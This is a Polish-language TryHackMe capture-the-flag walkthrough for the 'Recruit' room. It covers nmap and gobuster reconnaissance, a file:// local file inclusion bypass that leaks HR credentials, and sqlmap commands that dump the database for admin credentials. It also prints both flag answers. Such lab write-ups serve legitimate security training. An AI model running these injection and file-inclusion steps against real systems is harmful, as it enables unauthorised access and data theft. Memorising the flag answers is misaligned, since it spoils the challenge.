---

# Rekrutuj — Przewodnik po wyzwaniu CTF TryHackMe

Zinfiltruj nowy portal Recruit. Zmapuj witrynę, znajdź luki i uzyskaj nieautoryzowany dostęp.

![](https://miro.medium.com/v2/resize:fit:875/1*UQ-x6Ds8rsriPBWgJyVBdQ.png)

## Zadanie 1: Wyzwanie rekrutacyjne

**Firma Recruit** właśnie uruchomiła nowy portal rekrutacyjny, który umożliwia pracownikom HR zarządzanie aplikacjami kandydatów, a administratorom nadzorowanie decyzji rekrutacyjnych. Chociaż platforma wydaje się funkcjonalna, kierownictwo podejrzewa, że ​​bezpieczeństwo mogło zostać pominięte podczas jej opracowywania. Twoim zadaniem jest ocena aplikacji jak prawdziwy atakujący, mapowanie jej struktury, nadużywanie ujawnionych funkcji i wykorzystywanie luk w zabezpieczeniach.

Czy potrafisz uzyskać początkowy dostęp, zwiększyć swój dostęp i ostatecznie zalogować się jako **administrator?**

**Odpowiedz na poniższe pytania:  
Pytanie (1):** Jaka jest wartość flagi po zalogowaniu się jako zwykły użytkownik? **THM{LOGGED_IN_USER}**

**Pytanie (2):** Jaka jest wartość flagi po zalogowaniu się jako administrator? **THM{LOGGED_IN_ADM1N1}**

Zacznijmy od sprawdzenia tego pomieszczenia i zobaczmy, jak zdobyliśmy flagi. Przede wszystkim wykonajmy skanowanie Nmap, aby sprawdzić, czy są jakieś otwarte porty, które mogłyby nam pomóc w rozwiązaniu tego CTF.

Użyłem tego polecenia: nmap -sS -vv -p- -A Machine_IP

Po wykonaniu skanowania Nmap znaleźliśmy tylko 3 otwarte porty:

- `**22/tcp SSH**`
- `**53/tcp DNS**`
- `**80/tcp http**`

root@ip- 10 - 114 - 111 - 158 :~ # nmap -sS -vv -p- -A 10.114.132.148  
 Uruchomienie Nmap 7.80 ( https: //nmap .org ) o 2026 - 04 - 25  11 : 39 BST   
NSE: Załadowano 151 skryptów do skanowania.   
NSE: Wstępne skanowanie skryptów.   
NSE: Rozpoczęcie skanowania poziomu uruchomieniowego 1 (z 3  
 ). Inicjowanie NSE o 11 : 39  
 Zakończenie NSE o 11 : 39 , upłynęło 0 . 00 s   
NSE: Rozpoczęcie skanowania poziomu uruchomieniowego 2 (z 3  
 ). Inicjowanie NSE o 11 : 39  
 Zakończenie NSE o 11 : 39 , upłynęło 0 . Upłynęło 00  
 s NSE: Rozpoczęcie skanowania poziomu uruchomieniowego 3 ( z 3  
 ). Inicjowanie NSE o 11:39 Zakończenie NSE o 11:39 , upłynęło 0,00 s Inicjowanie skanowania ping o 11:39 Skanowanie 10.114.132.148 [ 4 porty ] Zakończenie skanowania ping o 11:39 , upłynęło 0,03 s ( łącznie 1 host) mass_dns : ostrzeżenie: Nie można otworzyć pliku /etc/resolv.conf . Spróbuj użyć -- system -dns lub określ prawidłowe serwery za pomocą --dns-servers mass_dns: ostrzeżenie: Nie można ustalić żadnych serwerów DNS. Odwrotny DNS jest wyłączony . Spróbuj użyć -- system -dns lub określ prawidłowe serwery za pomocą --dns-servers Inicjowanie skanowania SYN Stealth o 11:39 Skanowanie recruit.thm ( 10.114.132.148 ) [ 65535 portów ] Odkryto otwarty port 22 / tcp na 10.114.132.148 Odkryto otwarty port 53 / tcp na 10.114.132.148 Odkryto otwarty port 80  

/tcp na 10.114 . 132.148  
 Zakończono skanowanie SYN Stealth o 11:39 , upłynęło 1,91 s ( łącznie 65535 portów) Rozpoczęto skanowanie usługi o 11:39 Skanowanie 3 usług na recruit.thm ( 10.114.132.148 ) Zakończono skanowanie usługi o 11:39 , upłynęło 6,01 s ( 3 usługi na 1 hoście) Rozpoczęto wykrywanie systemu operacyjnego (próba nr 1) na recruit.thm (10.114.132.148) Ponowienie wykrywania systemu operacyjnego (próba nr 2) na recruit.thm (10.114.132.148) Ponowienie wykrywania systemu operacyjnego (próba nr 3) na recruit.thm (10.114.132.148) Ponowienie wykrywania systemu operacyjnego (próba nr 4) na recruit.thm (10.114.132.148) Ponowna próba wykrycia systemu operacyjnego (próba nr 5) na podstawie recruit.thm (10.114.132.148) Inicjowanie śledzenia trasy o 11:40 Zakończono śledzenie trasy o 11:40, upłynęło 0,01 s NSE : Skanowanie skryptów 10.114.132.148 . NSE : Rozpoczęcie skanowania poziomu uruchomienia 1 ( z 3). Inicjowanie NSE o 11:40 Zakończono NSE o 11:40 , upłynęło 8,09 s NSE : Rozpoczęcie skanowania poziomu uruchomienia 2 ( z 3). Inicjowanie NSE o 11:40 Zakończono NSE o 11:40, upłynęło 0,01 s NSE: Rozpoczęcie skanowania poziomu uruchomienia 3 (z 3 ). Inicjowanie NSE o 11:40 Zakończono NSE o 11:40 , upłynęło 0,01 s NSE : Upłynęło 01 s NSE: Rozpoczęcie skanowania poziomu uruchomieniowego 3 ( z 3 ). Inicjowanie NSE o 11:40 Zakończenie NSE o 11:40 , upłynęło 0,00 s Raport skanowania Nmap dla recruit.thm ( 10.114.132.148 ) Host jest aktywny, odebrano echo - odpowiedź ttl 64 ( opóźnienie 0,00044 s ) . Przeskanowano o 2026 - 04 - 25 11:39:48 BST przez 28 s   
Nie pokazano: 65532 zamknięte porty   
Powód: 65532 resetuje   
PORT STAN USŁUGA POWÓD WERSJA   
22 /tcp open   ssh syn-ack ttl 64 OpenSSH 8.2 p1 Ubuntu 4 ubuntu 0 . 7 (Ubuntu Linux; protokół 2.0 )   
53 /tcp open   domain syn-ack ttl 64 ISC BIND 9.16 . 1 (Ubuntu Linux)   
| dns-nsid:   
| _   bind.version: 9.16 . 1 -Ubuntu   
80 /tcp open   http syn-ack ttl 64 Apache httpd 2.4 . 41 ((Ubuntu))   
| http-cookie-flags:   
|    /:   
| PHPSESSID:   
|_ flaga httponly nie jest ustawiona   
| http-methods:   
|_ Obsługiwane metody: GET HEAD POST OPTIONS   
|_http-server-header: Apache/ 2.4 . 41 (Ubuntu)   
|_http-title: Recruit   
Brak dokładnych dopasowań systemu operacyjnego dla hosta (jeśli wiesz, jaki system operacyjny jest na nim uruchomiony, zapoznaj się z informacjami na stronie https: //nmap .org/submit/ ).   
Odcisk palca TCP/IP:   
OS:SCAN(V= 7,80 %E= 4 %D= 4 / 25 %OT= 22 %CT= 1 %CU= 44616 %PV=Y%DS= 1 %DC=T%G=Y%TM= 69 EC9A1   
OS: 0 %P=x86_64-pc-linux-gnu)SEQ(SP= 108 %GCD= 1 %ISR= 10 A%TI=Z%CI=Z%II=I%TS=A)OPS   
OS:(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M23   
OS: 01 ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4   
OS:B3)ECN(R=Y%DF=Y%T= 40 %W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T= 40 %S=O%A   
OS:=S+%F=AS%RD= 0 %Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T= 40 %W= 0 %S=A%A=Z%F=R%O=%RD= 0 %   
OS:Q=)T5(R=Y%DF=Y%T= 40 %W= 0 %S=Z%A=S+%F=AR%O=%RD= 0 %Q=)T6(R=Y%DF=Y%T= 40 %W= 0 %S=   
OS:A%A=Z%F=R%O=%RD= 0 %Q=)T7(R=Y%DF=Y%T= 40 %W= 0%S=Z%A=S+%F=AR%O=%RD= 0 %Q=)U1(R=   
OS:Y%DF=N%T= 40 %IPL= 164 %UN= 0 %RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N% OS :  
 T= 40 %CD=S)   
  
Szacowany czas sprawności: 5,968 dni (od niedzieli 19  kwietnia 12:25:41 2026 ) Odległość sieciowa: 1 przeskok Prognoza sekwencji TCP : Stopień trudności= 264 (Powodzenia!) Generowanie sekwencji identyfikatorów IP: Wszystkie zera Informacje o usłudze: System operacyjny: Linux; CPE: cpe: /o:linux:linux_kernel TRACEROUTE (używa portu 993/ tcp) ADRES RTT PRZESKOKU 1 0 . 52 ms recruit.thm ( 10.114.132.148 ) NSE: Skrypt po skanowaniu. NSE: Rozpoczęcie skanowania poziomu uruchomienia 1 (z 3 ). Inicjowanie NSE o 11:40 Zakończono NSE o 11:40 , upłynęło 0,00 s . NSE : Rozpoczęcie skanowania poziomu uruchomienia 2 ( z 3 ). Inicjowanie NSE o 11:40 Zakończono NSE o 11:40 , upłynęło 0,00 s . NSE : Rozpoczęcie skanowania poziomu uruchomienia 3 ( z 3 ). Inicjowanie NSE o 11:40 Zakończono NSE o 11:40 , upłynęło 0,00 s . Odczytano pliki danych z: /usr/bin/../share/nmap Wykonano wykrywanie systemu operacyjnego i usług . Prosimy o zgłaszanie wszelkich nieprawidłowych wyników na stronie https://nmap.org/submit/ . Nmap gotowy: przeskanowano 1 adres IP ( 1 host aktywny) w 28,97 sekundy.Wysłano surowe pakiety: 65659 ( 2,893 MB) | Odebrano: 65616 ( 2,628 MB)    

Skoro już znamy otwarte porty, sprawdźmy port 80, aby zobaczyć, co się na nim znajduje, ale najpierw dodajmy domenę recruit.thm do naszego sudoers, aby móc dobrze wyszukać tę domenę i przeprowadzić idealne wyszukiwanie.

Polecenie używane do edycji pliku hosts: nano /etc/hosts, dodaj do niego adres IP maszyny

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*2WFwZWflv30tDakImEyzqQ.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*H1R0RwppZbMi-oM3ESS4dA.png)

Możemy zobaczyć, że mamy stronę logowania, ale wypróbowałem kilka poleceń, aby sprawdzić, czy nie występuje atak SQL injection, a także użyłem domyślnych danych logowania, takich jak **admin:admin** , **admin:hasło itd.** , ale nic nie pomogło. Uruchommy więc **Gobustera** , aby sprawdzić, jakie katalogi są tu dostępne.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*tJUg2aCHKL4lEUV9AUxobg.png)

Użyłem tego polecenia : gobuster dir -u recruit.thm -w /usr/share/wordlists/directory-list-2.3-medium.txt

Znaleźliśmy te katalogi:

- `**mail**`
- `**assets**`
- `**phpmyadmin**`
- `**server-status**`

Sprawdźmy każdy katalog **pocztowy** , bo wydaje się interesujący.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*C2Ux2tLwhmXiqVJIw2GrbQ.png)

Teraz wiemy, że dane uwierzytelniające, których potrzebujemy, znajdują się w pliku **config.php** , a dane uwierzytelniające **administratora** są przechowywane w bazie danych. Jest to interesująca kwestia, ale zostawmy ją na później.

Zauważyłem również, że istnieje katalog pod nazwą Acess api, sprawdźmy go również

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*Gnl-7Swr0hEMAciJpouHNg.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*X4oCCTrmMXXv9iS7xSrtug.png)

Te informacje mogą nam pomóc w odzyskaniu pliku config.php!

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*IcXd982LEkrP68oXvxw6Jw.png)

Spróbowałem użyć polecenia **cv=config.php,** ale wspomniano w nim, że dozwolone są pliki lokalne, więc pomyślałem o użyciu tego polecenia, aby ominąć potencjalne problemy, ponieważ pomaga to ominąć podstawowe filtry bezpieczeństwa, które sprawdzają tylko „kropki i ukośniki” ( `../`), ale ignorują protokoły, dzięki czemu jesteśmy w stanie wykonać dołączanie plików lokalnych.

plik.php?cv=file://config.php

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*ZntnJlwFb0tC1ZS72vOyOg.png)

Świetnie, znaleźliśmy **hasło HR!**

dane uwierzytelniające:   
nazwa użytkownika: hr   
hasło: hrpassword123

wróćmy do strony logowania i zalogujmy się przy użyciu tych danych

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*Q6NZmZ6swPlxxPlrY4rcEg.png)

Świetnie, jesteśmy zalogowani i mamy naszą pierwszą flagę, która brzmi „ **THM{LOGGED_IN_USER}** ”

[](https://medium.com/plans?source=promotion_paragraph---post_body_banner_unlock_stories_blocks--17acbd4956f7---------------------------------------)

OK, teraz jesteśmy zalogowani jako użytkownik, musimy zwiększyć nasze uprawnienia, aby zostać administratorem. Przypomniałem sobie z wiadomości, którą znaleźliśmy wcześniej, że znaleziono coś związanego z tym, że dane uwierzytelniające administratora są przechowywane w bazie danych, więc pomyślałem o przetestowaniu tego pod kątem wstrzykiwania kodu SQL

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*rdt38cIMPoODnbtLAZBK2w.png)

Pomyślałem więc o przetestowaniu parametru wyszukiwania i użyłem tylko „ ' „, aby sprawdzić, czy jest podatny na atak typu SQL Injection. Jest podatny, jak widać:

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*UhpIUoFlNbCf67reDa5UTA.png)

Przechwyćmy żądanie z Burp Suite i użyjmy naszego ulubionego narzędzia „sqlmap”, aby przeprowadzić atak typu sql injection.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*aeZ0SrCajdtdvk9g7bJM2w.png)

Kliknij prawym przyciskiem myszy na dowolny element żądania i kliknij Kopiuj do pliku, a następnie zmień nazwę na dowolną.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*7U3pIU4dEMHj_VZuizfp6g.png)

Teraz użyjmy sqlmap na tym pliku

Użyte polecenie: sqlmap - r < request_file >  - p < vulnerable_parameter >  --dbs  
 , więc będzie to: sqlmap - r request.txt - p search  --dbs

Za pomocą tego polecenia przeszukujemy dostępne tutaj bazy danych.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*hYLgOiIPSjhBrJ78Qrs5Ow.png)

![](https://miro.medium.com/v2/resize:fit:603/1*P7pt-0XZYB_21Hzk3OGKTw.png)

idealnie otrzymaliśmy wyniki, z których wynika, że ​​mamy 6 dostępnych baz danych, którymi są:

- `**information_schema**`
- `**mysql**`
- `**performance_schema**`
- `**phpmyadmin**`
- `**recruit_db**`
- `**sys**`

Najważniejszy tutaj jest **recruit_db** , więc będziemy go tutaj używać

Użyte polecenie: sqlmap -r < plik_żądania > -p < parametr_narażony > -D < nazwa_bazy_danych > --tables   
, więc będzie to: sqlmap -r request.txt -p search -D recruit_db --tables

Korzystając z tego polecenia użyjemy bazy danych recruit_db i ujawnimy również jej tabele, aby uzyskać więcej informacji na jej temat.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*p2Z5EF-ElRSoCVhXOBtEpg.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*mTmsuHxXfAniQkIqK5tTAQ.png)

idealnie, otrzymaliśmy wyniki, które wskazują, że mamy 2 dostępne tabele, które są następujące:

- `**candidates**`
- `**users**`

Teraz będziemy używać tabeli **użytkowników** , ponieważ najważniejsze jest poznanie wszystkich dostępnych użytkowników.

Użyte polecenie: sqlmap -r < plik_żądania > -p < parametr_narażony > -D < nazwa_bazy_danych > -T < nazwa_tabeli > --columns   
, więc będzie to: sqlmap -r request.txt -p search -D recruit_db -T users --columns

Korzystając z tego polecenia, użyjemy bazy danych recruit_db, a także tabeli users, aby uzyskać więcej informacji o kolumnach.

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*U_eDFZb9s7NgyYMEH-TR-A.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*qDQhracook-VLift8o0ggQ.png)

Teraz wiemy, że mamy 3 dostępne kolumny, więc zrzućmy bazę danych, aby uzyskać wszystkie informacje.

Użyte polecenie: sqlmap -r <plik_żądania> -D <nazwa_bazy_danych> --dump-all  
 , więc będzie to: sqlmap -r request.txt -D recruit_db --dump-all

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*18OSlUEp6N1d6bwt3gQTjA.png)

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*OgMAHcdQYHlJWAgCG3ViiA.png)

I oto mamy nasze dane uwierzytelniające administratora, których możemy użyć do zalogowania się

dane uwierzytelniające:   
nazwa użytkownika: admin   
hasło: admin@001admin

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*mp_8ej82WM6FML235adxzw.png)

I to wszystko, mamy naszą flagę administratora, która brzmi „ **THM{LOGGED_IN_ADM1N1}** ”

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*kWj5kIFmg0QY1nU96CelKA.png)

**Odpowiedz na poniższe pytania:  
Pytanie (1):** Jaka jest wartość flagi po zalogowaniu się jako zwykły użytkownik? **THM{LOGGED_IN_USER}**

**Pytanie (2):** Jaka jest wartość flagi po zalogowaniu się jako administrator? **THM{LOGGED_IN_ADM1N1}**

Naciśnij Enter lub kliknij, aby zobaczyć obraz w pełnym rozmiarze

![](https://miro.medium.com/v2/resize:fit:875/1*qGLd_quIyqFIjV8tmORcWA.png)

**Mam nadzieję, że podobała się Wam ta demonstracja i życzę Wam cudownego dnia :))**
